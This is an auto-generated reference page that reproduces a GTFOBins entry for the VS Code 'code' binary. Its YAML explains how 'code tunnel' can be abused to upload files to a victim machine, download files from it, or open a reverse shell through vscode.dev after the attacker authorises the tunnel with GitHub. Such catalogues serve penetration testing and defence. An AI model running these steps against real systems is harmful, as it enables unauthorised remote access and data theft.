---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# code

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `code` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/code` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [code](../../tools/linux/code.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | code |
| name | code |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/code/ |

## Preserved Source Material

```yaml
_body: ''
_name: code
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/code
functions:
  download:
  - code: code tunnel --name xxxxxx
    comment: 'This requires a valid GitHub account.


      Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided
      code to authorize the tunnel.'
    contexts:
      sudo: null
      unprivileged: null
    sender:
      comment: 'Navigate to <https://vscode.dev/tunnel/xxxxxx> where a remote VS Code instance can be used to upload files
        to the victim box.


        From the menu, select "File" -> "Open Folder...", right-click on the explorer pane, then select "Upload..." to pick
        a file to send.


        Alternatively it''s possible to just create and edit files.'
  reverse-shell:
  - code: code tunnel --name xxxxxx
    comment: 'This requires a valid GitHub account.


      Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided
      code to authorize the tunnel.'
    contexts:
      sudo: null
      unprivileged: null
    listener:
      comment: 'Navigate to <https://vscode.dev/tunnel/xxxxxx> where a remote VS Code instance can be used to spawn a system
        shell on the victim box.


        From the menu, select "View" -> "Terminal".'
    tty: true
  upload:
  - code: code tunnel --name xxxxxx
    comment: 'This requires a valid GitHub account.


      Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided
      code to authorize the tunnel.'
    contexts:
      sudo: null
      unprivileged: null
    receiver:
      comment: 'Navigate to <https://vscode.dev/tunnel/xxxxxx> where a remote VS Code instance can be used to download files
        from the victim box.


        From the menu, select "File" -> "Open Folder...", right-click on the explorer pane, then select Download..." to download
        a file.


        Alternatively it''s possible to just display files.'
```
